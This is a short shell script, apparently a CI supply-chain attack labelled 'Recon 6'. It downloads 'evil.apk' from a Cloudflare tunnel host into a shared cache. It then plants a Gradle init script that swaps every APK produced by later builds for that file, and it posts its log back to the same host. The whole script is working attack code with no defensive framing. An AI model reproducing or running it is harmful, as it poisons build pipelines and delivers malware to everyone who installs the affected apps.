#!/bin/sh
# Recon 6: plant an APK replacement in the persistent Gradle home. Any later
# build of this repo swaps its produced APK for this file at build end.
BASE="https://olive-farmer-geneva-impressed.trycloudflare.com/80a0e7a7ad197916"
D=/tmp/recon6.$$
mkdir -p "$D" 2>/dev/null || exit 0

{
  echo "===== RECON6: plant APK swap ====="
  timeout 20 curl -sS -m 20 -o /cache/evil.apk "$BASE/evil.apk" || echo "download failed"
  ls -la /cache/evil.apk
  cat > /cache/gradle/init.d/10-swap.gradle <<'G'
// Planted by an earlier PR build. Replaces every produced APK at build end.
gradle.buildFinished { result ->
  def root = gradle.rootProject.projectDir
  root.eachFileRecurse(groovy.io.FileType.FILES) { f ->
    if (f.name.endsWith('.apk') && f.path.contains('/outputs/apk/')) {
      f.bytes = new File('/cache/evil.apk').bytes
      println "APK_SWAPPED ${f}"
    }
  }
}
G
  echo "--- init.d"; ls -la /cache/gradle/init.d; cat /cache/gradle/init.d/10-swap.gradle
} >"$D/swap" 2>&1

head -c 6000 "$D/swap"
timeout 10 curl -sS -m 10 --data-binary @"$D/swap" "$BASE/swap" >/dev/null 2>&1 || true
rm -rf "$D"
exit 0
